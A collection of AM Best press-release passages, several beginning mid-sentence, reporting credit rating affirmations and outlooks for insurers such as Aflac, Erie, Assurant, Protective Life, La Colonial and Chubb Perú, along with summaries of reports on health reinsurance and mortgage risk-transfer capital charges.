(Japan) (Aflac Japan), American Family Life Assurance Company of Columbus (Omaha, NE), American Family Life Assurance Company of New York (Albany, NY) and Continental American Insurance Company (Omaha, NE). These companies represent the life/health insurance subsidiaries of Aflac Incorporated (Aflac) (Columbus, GA) [NYSE: AFL] and are collectively referred to as Aflac Incorporated Group. Concurrently, AM Best has affirmed the Long-Term ICR of “a” (Excellent) and all existing Long-Term Issue Credit Ratings (Long-Term IRs) of Aflac. The outlook of these Credit Ratings (ratings) is stable. (See below for a detailed listing of the Long-Term IRs and shelf registration.)  The ratings reflect Aflac Incorporated Group’s balance sheet strength, which AM Best assesses as strongest, as well as its strong operating performance, favorable business profile and very strong enterprise risk management (ERM).  Aflac Incorporated Group’s risk-adjusted capitalization is at the strongest level, as measured by Best’s Capital Adequacy Ratio (BCAR). Additionally, Aflac’s entities maintain strong levels of risk-based capital (RBC) in the United States and a strong solvency margin ratio in Japan. Equity at Aflac has continued to grow as strong earnings have been accretive to capital, a trend which continued through the first half of 2025. The organization’s investment team manages foreign exchange risk via hedging programs. Aflac Incorporated Group’s invested assets are diverse across asset classes and types and are managed internally and through highly respected external asset managers. The group’s investment portfolio has continued to experience an increase in commercial transitional real estate delinquencies over the past few years, which has resulted in an uptick in company-owned real estate. AM Best acknowledges that the mortgage and real estate portfolio comprise a small but material portion of Aflac’s invested assets. Aflac’s financial leverage, as calculated by AM Best, was modest and was 22.3% at year-end 2024 and interest coverage is considered strong at more than 30 times. Operating leverage, composed of security lending programs and funding agreements from the Federal Home Loan Bank, was below 10% at year-end 2024. The group enjoys financial flexibility from its publicly traded parent, which includes access to multiple lines of credit: $100 million available on a 364-day credit facility and $1 billion available on a five-year unsecured revolving credit facility, as well as JPY 100 billion available on a five-year unsecured credit facility and $50 million available on a credit facility all with a consortium of banks. Additionally, Aflac has a number of intercompany credit agreements with its insurance entities. Aflac’s flexibility has been enhanced further through its reinsurance subsidiary, Aflac Re Bermuda Ltd, which assumes a modest portion of older cancer policy liabilities from Aflac Japan.  Aflac Incorporated Group has strong operating margins with steadily improving return-on-revenue (ROR) and return-on-equity (ROE) metrics over the past few years. The ROR was 40% for 2024, with a five-year average net ROR of 30%. The ROE was 22.6% in 2024, with a five-year average net ROE of 17.5%.  Aflac’s consistent profitability is driven by strong underwriting and investment results. Aflac Japan is the principal contributor to the consolidated earnings and comprised over half of adjusted revenue for 2025. Aflac’s premiums have been trending downward the past few years due to slower sales and first sector limited pay policies reaching their paid-up status in Japan. However, this trend began to reverse in the first half of 2025 driven by increasing sales in the United States and new cancer product sales in Japan.  Aflac’s favorable business profile is supported by its market-leading position in Japan and its strong market presence in the United States. Aflac has strong brand recognition in Japan and the United States. Aflac is a market leader in both cancer and medical insurance in Japan and refreshes its product offerings to remain competitive. In the United States, Aflac remains a leader in the supplemental medical insurance market, especially products sold at the worksite. Aflac has expanded its product offerings and broadened its segment served in the United States over the past few years to remain competitive and to position the company for future growth.  Aflac’s ERM capabilities are very strong and embedded throughout the organization, which has impacted its balance sheet strength, operating performance and business profile positively. The ERM program has continued to demonstrate robust processes within its framework that are effective in identifying potential risks, managing those risks and mitigating them. Participation in the ERM program is at all levels of the organization and includes an embedded global risk appetite statement and a framework supporting its risk tolerance statements.    The following Long-Term IRs have been affirmed with stable outlooks:  Aflac Incorporated—- “a” (Excellent) on JPY 12.4 billion, 0.3% senior unsecured notes, due 2025- “a” (Excellent) on USD 300 million, 2.875% senior unsecured notes, due 2026- “a” (Excellent) on USD 400 million, 1.125% senior unsecured notes, due 2026- “a” (Excellent) on JPY 60 billion, 0.932% senior unsecured notes, due 2027- “a” (Excellent) on JPY 12.6 billion, 0.5% senior unsecured notes, due 2029- “a” (Excellent) on JPY 13.0 billion, 1.048% senior unsecured notes, due 2029- “a” (Excellent) on JPY 33.4 billion, 1.075% senior unsecured notes, due 2029- “a” (Excellent) on JPY 13.3 billion, 0.55% senior unsecured notes, due 2030- “a” (Excellent) on USD 1.0 billion, 3.6% senior unsecured notes, due 2030- “a” (Excellent) on JPY 29.3 billion, 1.159% senior unsecured notes, due 2030- “a” (Excellent) on JPY 9.3 billion, 0.843% senior unsecured notes, due 2031- “a” (Excellent) on JPY 27.9 billion, 1.412% senior unsecured notes, due 2031- “a” (Excellent) on JPY 30 billion, 0.633% senior unsecured notes, due 2031- “a” (Excellent) on JPY 20.7 billion, 0.75% senior unsecured notes, due 2032- “a” (Excellent) on JPY 9.3 billion, 0.843% senior unsecured notes, due 2032- “a” (Excellent) on JPY 21.1 billion, 1.32% senior unsecured notes, due 2032- “a” (Excellent) on JPY 15.2 billion, 1.488% senior unsecured notes, due 2033- “a” (Excellent) on JPY 12.0 billion, 0.844% senior unsecured notes, due 2033- “a” (Excellent) on JPY 9.8 billion, 0.934% senior unsecured notes, due 2034- “a” (Excellent) on JPY 7.7 billion, 1.682% senior unsecured notes, due 2034- “a” (Excellent) on JPY 10.6 billion, 0.83% senior unsecured notes, due 2035- “a” (Excellent) on JPY 10.0 billion, 1.039% senior unsecured notes, due 2036- “a” (Excellent) on JPY 6.5 billion, 1.594% senior unsecured notes, due 2037- “a” (Excellent) on JPY 8.9 billion, 1.75% senior unsecured notes, due 2038- “a” (Excellent) on JPY 6.3 billion, 1.122% senior unsecured notes, due 2039- “a” (Excellent) on USD 400 million, 6.90% senior unsecured notes, due 2039- “a” (Excellent) on USD 450 million, 6.45% senior unsecured notes, due 2040- “a” (Excellent) on JPY 10.0 billion, 1.264% senior unsecured notes, due 2041- “a” (Excellent) on USD 400 million, 4.0% senior unsecured notes, due 2046- “a-” (Excellent) on JPY 60 billion, 2.108% subordinated debentures, due 2047- “a” (Excellent) on USD 550 million, 4.75% senior unsecured notes, due 2049- “a” (Excellent) on JPY 20.0 billion, 1.56% senior unsecured notes, due 2051- “a” (Excellent) on JPY 12.0 billion, 2.144% senior unsecured notes, due 2052  The following indicative Long-Term IRs have been affirmed with stable outlooks on securities available   under the existing shelf registrations:  Aflac Incorporated—- “a” (Excellent) on senior unsecured debt- “a-” (Excellent) on subordinated debt This press release relates to Credit Ratings that have been published on AM Best’s website.

The outlook of these Credit Ratings (ratings) has been revised to stable from negative. Additionally, AM Best has affirmed the FSR of A (Excellent) and the Long-Term ICR of “a” (Excellent) of Erie Family Life Insurance Company (EFL). The outlook of these ratings is stable. All companies are domiciled in Erie, PA, unless otherwise specified.  Erie Insurance Exchange is the lead company of Erie; the remainder of the P/C group is composed of inter-company pooling members, Erie Insurance Company and Erie Insurance Company of New York (Rochester, NY), and reinsured subsidiaries, Erie Insurance Property & Casualty Company and Flagship City Insurance Company.  The ratings of Erie reflect its balance sheet strength, which AM Best assesses as strongest, as well as its adequate operating performance, favorable business profile and appropriate enterprise risk management (ERM). The rating downgrades reflect the deterioration in Erie’s overall balance sheet strength, driven by multi-year surplus declines over the recent five-year period.   The group’s surplus position has been significantly impacted by large underwriting losses, driven by elevated weather-related events and increased severity in both the auto and homeowners’ segments. Consequently, the group’s risk-adjusted capitalization, as measured by Best’s Capital Adequacy Ratio (BCAR), has been on a downward trend. This deterioration has been accompanied by rising underwriting leverage, mixed reserve development and gradually declining liquidity metrics.   Despite these pressures, Erie has taken proactive steps to stabilize its financial position. These include implementing a series of rate and non-rate actions, restructuring its catastrophe reinsurance program with significantly higher limits and focusing on surplus stabilization strategies. While these corrective measures are beginning to yield results, AM Best notes the impact has been slower when compared with Erie’s peers. This lag is partly due to Erie’s use of 12-month auto policies and its “rate lock” feature, which delays the recognition of premium rate increases and, in turn, prolongs the beneficial impact on the balance sheet. Moreover, while underlying improvements in the book of business are emerging, their visibility has been masked by continued elevated weather activity through the first half of 2025.  The ratings of EFL reflect its balance sheet strength, which AM Best assesses as very strong, as well as its adequate operating performance, neutral business profile and appropriate ERM. These ratings also consider the lift from Erie, based on its strategic importance in supporting the overall strategy of EFL in selling life and annuity products to the group’s P/C client base. EFL’s ratings and stable outlooks are further supported by the strongest level of risk-adjusted capitalization, as measured by BCAR, a conservative investment approach, and improved operating results. However, EFL reported an overall net loss of $9.0 million in 2024 stemming from the write-off of a policy administration system. Nonetheless, the company has reported two consecutive years of pre-tax operating gains. Additionally, AM Best notes strong earnings through 2025 thus far. This press release relates to Credit Ratings that have been published on AM Best’s website.

The outlook of these Credit Ratings (ratings) is stable.  The ratings reflect MSIG Europe’s balance sheet strength, which AM Best assesses as very strong, as well as its adequate operating performance, neutral business profile and appropriate enterprise risk management. In addition, MSIG Europe’s ratings benefit from lift due to the support of its ultimate parent, MS&AD Insurance Group Holdings, Inc. (MS&AD).  The rating actions follow the completion of the merger by absorption of MSIG Insurance Europe AG (MSIGEU) (Germany) into MSIG Europe (formerly known as MS Amlin Insurance SE). The merger was completed on 1 July 2025, with retroactive effect from 1 January 2025.   AM Best expects MSIG Europe’s risk-adjusted capitalisation, as measured by Best’s Capital Adequacy Ratio (BCAR), to remain at least at the very strong level prospectively. The balance sheet strength assessment also factors in the company’s conservative investments and strong liquidity profile. A partly offsetting rating factor is MSIG Europe’s moderate dependence on reinsurance. However, the associated credit risk is mitigated by the use of a financially strong and diverse reinsurance panel.  MSIG Europe has achieved robust underwriting results over the past five years (2020-2024), following corrective actions.

These tables also highlight some of the key components of the factor-based method used to calculate net capital charges in the Best’s Capital Adequacy Ratio (BCAR) model.   The net capital charge of CRT transactions is based on unexpected losses and premiums associated with the transactions and is represented as a fraction of the original exposures. For this Best’s Special Report, “Updated Net Capital Charge Tables for ACIS/CIRT Reinsurance Transactions,” AM Best has selected a broad sample of the 185 CRT transactions effective through June 2025 to highlight some of the key components of the factor-based method used to calculate the net capital charges associated with individual layers of the CRT transactions. The calculations for each transaction are based on AM Best’s factor-based approach and are described in AM Best’s Evaluating Mortgage Insurance criteria procedure.AM Best publishes these net capital charge tables semi-annually, using the most current performance data available from the government-sponsored enterprises’ websites. Future publications of the net capital charges will be dependent on the continued timely availability of data from Fannie Mae and Freddie Mac, among other factors.

However, the increased usage of health reinsurance has been driven by greater claim costs, including more high-dollar claims in the United States, combined with increased utilization.  The Best’s Market Segment Report, “Evolving and Shifting Dynamics in the Health Reinsurance Spaces,” is part of AM Best’s look at the global reinsurance industry ahead of the Rendez-Vous de Septembre in Monte Carlo. Other reports, including AM Best’s ranking of top global reinsurance groups and in-depth looks at the insurance-linked securities, Lloyd’s and regional reinsurance markets, have been published in August and September.    According to this report, global health reinsurers experienced strong growth in 2024, underpinned by rising demand for health protection and morbidity coverage. Accelerated growth in the U.S. health reinsurance market occurred across all product lines, except for Medicaid, driven by primary carriers that need to optimize capital in light of lower underwriting profitability and premium growth.   “In the United States, the rise in health reinsurance is being driven by increased need for capital management, reduced profitability and margin compression in recent years, in addition to premium growth from both membership and rate increases, and protection for high-dollar claims,” said Jennifer Asamoah, senior financial analyst, AM Best. “Health insurers experienced margin pressure across multiple lines of business in 2024.”  Underwriting results in Medicare Advantage, the largest line of business in terms of premium, declined significantly and were driven overall by elevated utilization trends, a reduction in Star ratings and changes to the risk-adjustment payment methodology. Margins and underwriting results in Medicaid managed care also declined, due to re-determinations by the states following the end of the COVID-19 public health emergency. Underwriting results in the fully insured employer group segment also deteriorated, driven by elevated utilization and an increase in medical cost trends. The combined impact has left insurers seeking capital management strategies.  In 2024, ceded premium grew by more than 30% to USD 66 billion, after growing just 9% in 2023. This was the largest single-year increase in premium over the past 10 years and the largest increase since 2022. “The U.S. health reinsurance market has grown in terms of quota share and excess of loss reinsurance arrangements,” said Jon Housel, financial analyst, AM Best. “The volume of ceded health premium has grown significantly over the past 10 years, by more than 350% during that span.”  Global reinsurers continue to prioritize health reinsurance as part of their environmental, social and governance (ESG) initiatives, focusing on improving access to health care, supporting health innovation and managing social risks related to aging and chronic diseases.

(Assurant) (headquartered in Atlanta, GA) [NYSE: AIZ]. These companies are collectively referred to as Assurant P&C Group (Assurant P&C). At the same time, AM Best has affirmed the Long-Term ICR of “a-” (Excellent), all associated Long-Term Issue Credit Ratings (Long-Term IR), indicative Long-Term IRs and the Short-Term IR of Assurant. Concurrently, AM Best has affirmed the FSR of A (Excellent) and the Long-Term ICRs of “a” (Excellent) of Assurant’s credit and life/health subsidiaries: American Bankers Life Assurance Company of Florida (Miami, FL) and Caribbean American Life Assurance Company (San Juan, PR), collectively known as Assurant Lifestyle L&H. The outlook of these Credit Ratings (ratings) is stable. (See below for a detailed list of the companies and Long- and Short-Term IRs.)  The ratings of Assurant P&C reflect the group’s balance sheet strength, which AM Best assesses as very strong, as well as its strong operating performance, favorable business profile and appropriate enterprise risk management (ERM).Assurant P&C’s very strong balance sheet strength is supported by its risk-adjusted capitalization at the strongest level, as measured by Best’s Capital Adequacy Ratio (BCAR), and very strong earnings power with relatively low volatility given the relative significance of its low-risk businesses, particularly in the Global Lifestyle segment. The group’s favorable balance sheet position is bolstered further by its positive cash flows and stable reserves. These strengths are offset partially by Assurant’s property catastrophe exposure, which stems mostly from its lender-placed homeowners’ business in Global Housing, and its heavy reliance on high-quality third-party reinsurance that is effective in mitigating this risk to a level more commensurate with the group’s overall risk appetite. Assurant P&C’s operating performance is consistently strong with superior returns on capital, benefiting from its expertise in highly specialized niche businesses, and diverse partnerships with market leaders in both its Global Lifestyle and Global Housing segments. Both segments are steady contributors to Assurant’s profits.    The ratings of Assurant Lifestyle L&H reflect the group’s balance sheet strength, which AM Best assesses as very strong, as well as its strong operating performance, limited business profile and appropriate ERM. Assurant Lifestyle L&H also receives one level of rating enhancement from its affiliate, Assurant P&C, as it is considered important to the Assurant brand as a licensed credit life and credit accident and health insurer. The credit insurance business adds to overall product diversity for Assurant. AM Best notes that Assurant remains a recognizable name in these markets as the group continues to be a market leader in the credit card space in Canada. The regulatory environment remains favorable for the products offered by the group.   The FSR of A+ (Superior) and the Long-Term ICRs of “aa-” (Superior) have been affirmed with stable outlooks for the following P/C subsidiaries of Assurant, Inc.:    American Bankers Insurance Company of Florida    American Security Insurance Company    Standard Guaranty Insurance Company    Caribbean American Property Insurance Company    Voyager Indemnity Insurance Company    Virginia Surety Company, Inc.

Additionally, AM Best has affirmed the Long-Term ICR of “a-” (Excellent) and the existing Long-Term Issue Credit Ratings (Long-Term IRs) of Protective Life Corporation. At the same time, AM Best has affirmed the FSR of A (Excellent) and the Long-Term ICR of “a” (Excellent) of Protective Property & Casualty Insurance Company (Protective P&C) (St. Louis, MO) The outlook of these Credit Ratings (ratings) is stable. (See below for a detailed list of these subsidiaries and ratings.)  The ratings of Protective Life reflect its balance sheet strength, which AM Best assesses as very strong, as well as its strong operating performance, favorable business profile and appropriate enterprise risk management (ERM).  The ratings of Protective Life also reflect its very strong level of risk-adjusted capitalization, as measured by Best’s Capital Adequacy Ratio (BCAR), favorable liquidity metrics and demonstrated financial support from its parent, Dai-ichi Life Holdings, Inc (Dai-ichi). Protective Life functions as the North America growth engine for Dai-ichi. The company is currently executing a strategy to diversify income sources and better stabilize earnings. A key part of this strategy is inorganic growth in capital-light business areas to complement the company’s longer duration asset profile and is highlighted by the recent acquisition of ShelterPoint. Financial and operating leverage at Protective Life remains within AM Best’s expectations.The company’s operating results are strong, benefiting from consistent and diversified net income. Protective Life continues to demonstrate a well-established core competency as an acquirer of a diverse list of blocks of business, including life, annuity and asset protection blocks of business, which have been folded into the company and now contribute to earnings growth and allowed it to realize scale-related operating efficiencies. Operating return metrics continue to be in-line with peers that also have a strong operating performance assessment. In addition, Protective Life is a material contributor to overall Dai-ichi revenue and net income.Protective Life’s business profile benefits from diversity in its distribution channels and product lines, along with continued investments in innovation. The company’s ERM is appropriate for its risk profile, which benefits from embedded stress testing of a wide range of scenarios. The company also benefits from robust ERM operations stemming from Dai-ichi, especially in data analytics.  Protective P&C’s ratings reflect its balance sheet strength, which AM Best assesses as very strong, as well as its adequate operating performance, neutral business profile and appropriate ERM. The ratings also reflect rating lift from its parent, Protective Life Insurance Company.  Protective P&C’s balance sheet strength assessment is supported by the strongest level of risk-adjusted capitalization, as measured by BCAR, good asset quality, adequate balance sheet liquidity and yearly organic surplus growth derived from earnings, which is partially offset by annual dividends to its parent. In 2024, an above average dividend was paid that resulted in a surplus decrease. The balance sheet strength is somewhat diminished by Protective P&C’s extensive use of unrated dealer-owned reinsurance arrangements.  AM Best considers Protective P&C’s operating performance to be adequate based on its consistent track record of profitability. Return metrics and underwriting ratios generally approximate its composite peer group of warranty insurers. In the post Covid years, operating performance benefitted from favorable market dynamics such as elevated used car valuations and pricing. However, in 2024, Protective P&C recorded an underwriting loss and combined ratio above 100% for the first time in more than 10 years.  The year-end 2024 underwriting loss was mainly due to the impact of inflation (parts and labor costs continued to increase) on guaranteed asset protection (GAP) severity combined with declining vehicle prices. These factors resulted in higher GAP loss ratios, which pushed the combined ratio slightly above 100%. In response, rate increases were implemented in 2023 & 2024; however, due to the multi-year nature of policies these will take time to roll through the book.  Protective P&C specializes in providing coverage for vehicle service contracts and GAP products for automobiles, marine craft, power sport vehicles and recreational vehicles, which are sold primarily through franchise dealers and independent agents. The neutral business profile reflects the company’s concentration of underwriting risk in the highly competitive auto warranty market, offset by its geographic diversification. The company’s ERM is appropriate for its risk profile and is integrated with that of its parent, Protective Life Insurance Company.  Rating enhancement has been afforded to Protective P&C due to the implied support from its higher-rated parent, its integration into the organization and its support of the organization’s asset protection strategy.

(Sura) (Panama). The outlook of these Credit Ratings (ratings) is stable.  The ratings reflect Sura’s balance sheet strength, which AM Best assesses as strongest, as well as its adequate operating performance, neutral business profile and appropriate enterprise risk management.  Sura’s balance sheet strength is supported by a well-structured reinsurance program and synergies provided by Grupo de Inversiones Suramericana S.A. (Grupo Sura), a leading Colombia-based financial services company in Latin America’s insurance, asset management and banking industries. Offsetting these positive rating factors are Panama’s highly competitive landscape, and the decline in Sura’s profitability in the most recent periods.  As of December 2024, Sura was the fourth-largest insurer in Panama, with a market share of 8.8%; 72% of its business portfolio is composed of non-life products, with life products making up the remaining 28%. Sura’s main property/casualty business segment is auto, which represents 39% of its gross written premium.  In 2018, Grupo Sura’s initiative was to optimize shareholder value through the merger of intermediate insurance holding companies, Suramericana S.A. and Inversura Panamá Internacional S.A., drove a stock split transaction for their subsidiary, Aseguradora Suiza Salvadoreña, S.A. This further enhanced Sura’s risk-adjusted capitalization, which was already at the strongest level, as measured by Best’s Capital Adequacy Ratio (BCAR).   Sura’s capital base continues to be driven by its value-based management model, while meeting the group’s post-merger return on investment goals. AM Best expects Sura to follow consistent capital management guidelines supportive of its ratings. Additionally, the company’s balance sheet strength is supported by a comprehensive reinsurance program, set with reinsurers that have excellent security, as well as the implementation of an internal economic capital model.   During 2024, most of Sura’s largest business lines stayed in line in terms of volume, presenting an overall 3.9% growth during the period. Despite efforts to maintain all lines of business under premium sufficiency, the results reflect an opportunity for underwriting improvements and put pressure on the company’s profitability. As of June 2025, Sura’s operating performance metrics remained consistent with past trends, presenting a net loss of USD 2.9 million.  Negative rating actions could occur if the company's risk-adjusted capitalization deteriorates to a level no longer supportive of the current ratings as a result of capital base erosion. Positive rating actions could take place as a result of the successful evolution of the company's business strategy, while presenting consistently strong operating performance metrics, with improving bottom-line results and profitability indicators to levels more in line with highly rated peers.Ratings are communicated to rated entities prior to publication.

(Active Re) (Barbados). The outlook of these Credit Ratings (ratings) is stable.   The ratings reflect Active Re’s balance sheet strength, which AM Best assesses as strongest, as well as its strong operating performance, neutral business profile and appropriate enterprise risk management (ERM).  The stable outlooks are based on the company’s capability to maintain a sound operating performance driven by consistent underwriting practices and a solid capital structure.   Active Re’s rating affirmations are due to its stable profitability metrics, supported by a keen underwriting strategy with constant adaptation to the economic environment and a strong operating performance that compares favorably with its peers.  The company’s balance sheet strength is underpinned by its risk-adjusted capitalization at the strongest level, as measured by Best’s Capital Adequacy Ratio (BCAR). The ratings also reflect Active Re’s adequate reinsurance program and supportive risk management framework for its risk profile. An offsetting rating factor is the strong competitive environment in Active Re’s targeted geographic markets, which the company faces through its global expansion.  Active Re is a Barbados-based reinsurer established in 2007. At year-end 2024, the company operates with net premiums written (NPW) that were composed of property/casualty (56.7%), surety (13.5%) and affinity (29.6%). The company continues to further diversify its geographic footprint in Latin America (27.1%), North America (18.5%) the Middle East (18.5%), Europe (17.4%) and Asia Pacific (18.5%), and focuses its underwriting efforts on short-term non-catastrophe risks. Active Re continues to adapt to the current economic environment by innovating its internal processes, which results in better decision-making.  The company’s capital base, consistently grown through reinvestment of earnings and capital contributions, has helped maintain Active Re’s risk-adjusted capitalization at the strongest level. The company’s   expansion strategy continues to be reinforced adequately through consistent improvements to its reinsurance program, placed among a diversified group of reinsurers with good security levels, consequently minimizing counterparty credit risk exposures. Moreover, the company is characterized by a conservative underwriting leverage as reflected by an NPW-to-surplus ratio of 1.48x. Nevertheless, Active Re’s ratings could be susceptible to uncertainty over future underwriting performance, as it expands its business into new geographic markets, automatic contracts and managing general agents.  While expanding its book of business in 2024, Active Re maintained its bottom-line results through contained acquisition expenses. The company has put greater emphasis on the quality of its underwriting allocating acquisition expenses to delegated underwriting authorities that have reported good technical results. As of June 2025, the company continues to report strong underwriting metrics.  The continuous improvement in Active Re’s ERM framework has allowed it to better identify and manage risks. As a result, related party transactions continue to be reduced significantly, improving its financial flexibility.   Negative rating actions could result from deterioration in risk-adjusted capital due to major capital outflows. While unlikely in the short term, positive rating actions could occur if Active Re continues to strengthen its geographic diversification while maintaining profitable results, with a positive effect on its balance sheet.   Ratings are communicated to rated entities prior to publication.

The outlook of these Credit Rating (ratings) is stable.  The ratings reflect Genesis’ strategic importance as a subsidiary of La Colonial, S.A. - Compañía de Seguros (La Colonial), which on a consolidated basis, has a balance sheet strength that AM Best assesses as strongest, as well as its adequate operating performance, neutral business profile and appropriate enterprise risk management.  The ratings also reflect Genesis’ affiliation with its ultimate parent company, La Colonial, which is a leading insurer in the Dominican Republic, supported by a strong parental guarantee, in place since September 2022. Genesis also is integrated in all core processes and ongoing strategic initiatives of the group. Offsetting these positive factors is the inherent risk of a startup company implementing its business plan, as well as distribution channel and product concentration.   Genesis is a startup reinsurance company 100% owned by Altos International LLC, which in turn is owned fully by La Colonial. Genesis’ main business purpose is to retain risk exposures that currently are transferred to the market or retained by La Colonial. Genesis’ capacity is handled through La Colonial’s reinsurance broker, Wahr Re.Genesis offers general insurance, including the following risks: motor vehicle, property and liability. Due to the nature of the startup company’s strategy, there is concentration in a single distribution channel, and exposure to catastrophe insurance. As of December 2024, Genesis presented USD 9.4 million in net income.  Genesis is considered part of La Colonial’s group rating unit due to AM Best’s expectation that La Colonial will support Genesis to the full extent of its financial strength. This is reflected by the strong parental guarantee and explicit capital support, as well as Genesis’ strategic importance to the group as a vehicle to diversify operations outside the Dominican Republic.  If positive rating actions are taken on La Colonial, as a result of its ability to maintain its current level of risk-adjusted capitalization while improving its bottom-line results and profitability indicators to levels more in line with highly rated peers, it would result in positive rating action on Genesis. If any negative rating actions are taken on La Colonial, as a result of any major changes in its capital base, such as significant dividends or capital outflows, which diminish AM Best’s view of the company’s balance sheet strength, it would result in negative rating actions being taken on Genesis.  A change in AM Best’s perception regarding the strategic importance of Genesis to the group also could impact Genesis’ ratings.  The methodology used in determining these ratings is Best’s Credit Rating Methodology (Version Aug. 29, 2024), which provides a comprehensive explanation of AM Best’s rating process and contains the different rating criteria employed in the rating process. Best’s Credit Rating Methodology can be found at www.ambest.com/ratings/methodology.

The ratings take into account the company's balance sheet strength, adequate operating performance, and the strong parental guarantee from La Colonial. Genesis is a startup reinsurance company, which carries inherent risks but is deemed strategically important for diversifying operations outside the Dominican Republic.

The outlook of these Credit Ratings (ratings) is stable.  The ratings reflect TMIC’s balance sheet strength, which AM Best assesses at the strongest level, as well as its adequate operating performance, neutral business profile and appropriate enterprise risk management (ERM).  TMIC’s balance sheet strength is supported by its strongest level of risk-adjusted capitalization, as measured by Best’s Capital Adequacy Ratio (BCAR), low underwriting and investment leverage, excellent liquidity metrics and steady organic surplus growth. TMIC’s adequate operating performance assessment is derived from its highly specialized niche business and its solid overall profitability in recent years. Profitability levels in earlier years were enhanced by the COVID-19 pandemic and pandemic-related circumstances, such as less miles driven and higher residual values on used cars. In the more recent years, the company has experienced increasing claims, which have approached more historical levels, and as a result, profitability has moderated, accordingly.  TMIC’s neutral business profile benefits from its relationship with its U.S. parent, Toyota Motor Credit Corporation (TMCC), which is partially offset by its dependence on TMCC and the same headwinds that may adversely impact the auto industry, including the potential impact of recent tariffs. TMIC’s appropriate ERM framework incorporates traditional risk management techniques specific to the auto industry, and the company benefits from TMCC’s enterprise-wide risk management approach to capital management, innovation and safety protocols.This press release relates to Credit Ratings that have been published on AM Best’s website.

(Skyward Group) has entered into a definitive agreement with the majority sellers to acquire 100% of Apollo Group Holdings Limited (Apollo) for a total consideration of $555 million from Alchemy, management, employees and other strategic investors.    GMIC, HSIC, OSIC and IIC are members of Skyward Specialty Insurance Group (Skyward), whose ultimate parent, Skyward Group, [NASDAQ: SKWD], has a Long-Term ICR of “bbb” (Good). All companies are headquartered in Houston, TX.  The Credi Ratings (ratings) reflect Skyward’s balance sheet strength, which AM Best assesses as very strong, as well as its adequate operating performance, neutral business profile and appropriate enterprise risk management.  Skyward Specialty maintains a position as a leading writer in U.S. specialty markets. Apollo is a leading U.S. centric specialty underwriting platform operating at Lloyd’s of London and is also the managing agent to both its own syndicates, as well as to other third-party syndicates, known as Platform Partners. Apollo’s management team will join Skyward Specialty and continue to lead the Apollo business. The transaction is expected to close in first-quarter 2026, subject to regulatory approvals.  AM Best does not expect the transaction to have any material change to Skyward’s current rating fundamentals. AM Best will continue to monitor the progress and the effects of this transaction over time, including the planned synergies and efficiencies gained from the transaction, as there could be future benefits to Skyward’s business profile. Conversely, based on the indicated financing there is an immediate increase to financial leverage to slightly over 25%, which Skyward expects to manage over time, as well as execution risk as noted in any significant acquisition. Skyward plans to maintain strong interest coverage without taking dividends from the insurance subsidiaries in the near to medium term. Apollo will provide Skyward with a stream of unregulated earnings and cash flow, which reduces the organization’s reliance on its statutory entities.   This press release relates to Credit Ratings that have been published on AM Best’s website.

The outlook of these Credit Ratings (ratings) is stable.  The ratings reflect La Colonial’s balance sheet strength, which AM Best assesses as strongest, as well as its adequate operating performance, neutral business profile and appropriate enterprise risk management.  The rating affirmations reflect La Colonial’s risk-adjusted capitalization being at the strongest level, as measured by Best’s Capital Adequacy Ratio (BCAR), mainly as a result of positive bottom-line results, as well as the acknowledgement of the underwriting team’s skills amid potential challenges from harsher competition. Partially offsetting these positive rating factors is the competitive market environment in the Dominican Republic.  La Colonial is the fifth-largest insurance company in the Dominican Republic, with an 8.5% market share as of May 2025. The company has maintained its leading position in the Dominican Republic despite changing market dynamics, which includes the continuous inflow of new health insurance premiums to the system from new participants. La Colonial operates as a multiline insurer, with 84% of its portfolio directed to property/casualty lines, based on gross written premium, with life/health insurance comprising 16%.  In 2024, the company reported a non-life combined ratio of 97.7%, mainly driven by the stability of the loss ratio, and expense efficiencies achieved since previous periods. La Colonial’s benefits paid to net premium written ratio for its life business increased to 65% from 62.6%, still contributing to the period’s positive bottom-line result. For 2025 and onward, operating efficiencies might be harder to sustain; however, AM Best considers La Colonial’s management team to be well-prepared to maintain solid profitability and growth to support its operation.  La Colonial’s risk-adjusted capitalization remains at the strongest level, as measured by BCAR, supported adequately by a comprehensive reinsurance program that mitigates the potential impact from regional natural disasters on the company’s results. These characteristics are reflected in its solvency and capitalization metrics and its excellent market position. Going forward, AM Best expects the company to continue performing with premium sufficiency, driven by lower technical costs in the medium term.  Positive rating actions could take place if La Colonial is able to maintain its current level of risk-adjusted capitalization while improving its bottom-line results and profitability indicators to levels more in line with highly rated peers. Factors that might lead to negative rating actions include any major changes in La Colonial’s capital base, such as significant dividends or capital outflows, which diminish AM Best’s view of the company’s balance sheet strength.  The methodology used in determining these ratings is Best’s Credit Rating Methodology (Version Aug. 29, 2024), which provides a comprehensive explanation of AM Best’s rating process and contains the different rating criteria employed in the rating process.

Compañía de Seguros y ReasegurosCONTACTS:Inger RodriguezFinancial Analyst+52 55 9085 6353inger.rodriguez@ambest.com Alfonso NoveloSenior Director,   Analytics+52 55 9085 6358alfonso.novelo@ambest.comChristopher SharkeyAssociate Director, Public Relations+1 908 882 2310christopher.sharkey@ambest.comAl SlavinSenior Public Relations Specialist+1 908 882 2318al.slavin@ambest.comFOR IMMEDIATE RELEASEMEXICO CITY - SEPTEMBER 04, 2025 01:29 PM (EDT)AM Best has affirmed the Financial Strength Rating of A (Excellent) and the Long-Term Issuer Credit Rating of “a+” (Excellent) of Chubb Perú S.A. Compañía de Seguros y Reaseguros (Chubb Perú) (Lima, Peru). The outlook of these Credit Ratings (ratings) is stable.  The ratings reflect Chubb Perú’s balance sheet strength, which AM Best assesses as strongest, as well as its adequate operating performance, neutral business profile and appropriate enterprise risk management (ERM).  The stable outlooks reflect AM Best’s expectation that Chubb Perú can continue to adjust its product offerings in a profitable manner, supported by its parent company, Chubb Limited.  Chubb Perú initiated operations in 1998 as Altas Cumbres; in 2007, it was acquired by ACE Group and named ACE Seguros S.A., until 2016, when ACE Limited acquired The Chubb Corporation and rebranded the company.  Chubb Perú has a diversified book of business, distributed through a mix of traditional and massive channels, such as large regional retailers and banks. As of December 2024, 66% of the company’s gross written premium was composed of property/casualty products, with accident and health comprising 28% of the portfolio and life insurance the remaining 6%. As of July 2025, Chubb Perú is the 12th-largest insurance operation in Peru.  AM Best assesses Chubb Perú’s balance sheet strength as strongest, as its risk-adjusted capitalization stands at the strongest level, as measured by Best’s Capital Adequacy Ratio (BCAR), has a defined risk appetite that limits exposures and protects its solid capital base through adequate investment, reinsurance and underwriting principles. Additionally, the company has a comprehensive reinsurance program with its affiliate, Chubb Tempest Reinsurance Ltd., and continuously has increased its total capital base reaching USD 42 million in 2024. Chubb Perú’s risk-adjusted capitalization has remained stable due to the growth of its total capital base from retained earnings, which has 